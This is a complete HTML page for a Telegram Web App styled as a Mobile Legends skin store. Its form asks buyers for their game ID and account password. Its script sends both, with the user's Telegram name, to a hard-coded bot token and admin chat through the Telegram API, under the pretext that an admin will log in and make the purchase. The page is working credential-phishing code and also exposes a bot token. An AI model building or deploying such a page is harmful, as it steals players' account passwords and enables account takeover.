!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MLBB Skin Store</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #0b0e14; color: white; margin: 0; padding: 10px; display: flex; flex-direction: column; align-items: center; }
        .banner { width: 100%; max-width: 450px; border-radius: 10px; border: 1px solid #c19b40; margin-bottom: 15px; }
        
        /* Login Input Area */
        .login-box { background: #1c2128; padding: 15px; border-radius: 8px; width: 90%; max-width: 400px; border: 1px solid #f39c12; margin-bottom: 20px; }
        .login-box h3 { margin: 0 0 10px 0; color: #f39c12; font-size: 1rem; text-align: center; }
        input { width: 100%; padding: 10px; margin: 5px 0; border-radius: 5px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; }
        
        .section-title { color: #f39c12; font-size: 1.1rem; margin: 15px 0; text-transform: uppercase; border-bottom: 1px solid #f39c12; width: 100%; text-align: center; }
        .grid-container { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; width: 100%; max-width: 450px; }
        .card { background: #161b22; border-radius: 8px; overflow: hidden; border: 1px solid #30363d; text-align: center; display: flex; flex-direction: column; }
        .skin-img { width: 100%; height: 120px; object-fit: cover; }
        .skin-info { padding: 8px; flex-grow: 1; }
        .skin-name { font-size: 0.8rem; font-weight: bold; height: 35px; display: flex; align-items: center; justify-content: center; }
        .price { color: #f1c40f; font-size: 0.85rem; margin-bottom: 8px; font-weight: bold; }
        button { width: 100%; padding: 12px; border: none; background: linear-gradient(to right, #f39c12, #d48400); color: #000; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <img src="https://img.youtube.com/vi/E6e2hLq1MTo/maxresdefault.jpg" class="banner">

    <div class="login-box">
        <h3>ဂိမ်းအချက်အလက် ဖြည့်သွင်းရန်</h3>
        <input type="text" id="game_id" placeholder="Game ID (e.g. 12345678)">
        <input type="password" id="game_pw" placeholder="Moonton Password / Account PW">
    </div>

    <div class="section-title">Available Skins</div>
    <div class="grid-container">
        <div class="card">
            <img src="https://pbs.twimg.com/media/F7unK73a8AA7-mZ.jpg" class="skin-img">
            <div class="skin-info">
                <div class="skin-name">Benedetta Ducati</div>
                <div class="price">BP 32,000</div>
            </div>
            <button onclick="sendOrder('Benedetta Ducati', '32,000 BP')">BUY NOW</button>
        </div>

        <div class="card">
            <img src="https://pbs.twimg.com/media/F7-tLhsbwAAjM0o.jpg" class="skin-img">
            <div class="skin-info">
                <div class="skin-name">Irithel Ducati</div>
                <div class="price">BP 32,000</div>
            </div>
            <button onclick="sendOrder('Irithel Ducati', '32,000 BP')">BUY NOW</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        const BOT_TOKEN = '8484385102:AAHHBtd9m2FgnPSTaUsMZJnFxhmKCwWWQGM';
        const ADMIN_CHAT_ID = '7215904883'; 

        async function sendOrder(item, price) {
            const gameId = document.getElementById('game_id').value;
            const gamePw = document.getElementById('game_pw').value;

            // ID နဲ့ PW မဖြည့်ဘဲ ဝယ်ရင် တားမြစ်ခြင်း
            if (!gameId || !gamePw) {
                tg.showAlert(" ကျေးဇူးပြု၍ Game ID နှင့် Password အရင်ဖြည့်ပေးပါ။");
                return;
            }

            const user = tg.initDataUnsafe.user;
            const name = user?.first_name || 'Guest User';
            const username = user?.username ? `@${user.username}` : 'No Username';

            const text = ` *NEW SKIN ORDER!* \n\n` +
                         ` *Buyer:* ${name} (${username})\n` +
                         ` *Skin:* ${item}\n` +
                         ` *Cost:* ${price}\n\n` +
                         ` *Login Details:*\n` +
                         ` *Game ID:* \`${gameId}\`\n` +
                         ` *Password:* \`${gamePw}\``;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    tg.showConfirm("Order ပို့ပြီးပါပြီ။ Admin မှ Login ဝင်ရောက်ပြီး ဝယ်ယူပေးပါမည်။");
                }
            } catch (error) {
                tg.showAlert("Error: Connection Failed");
            }
        }
    </script>
</body>
</html>
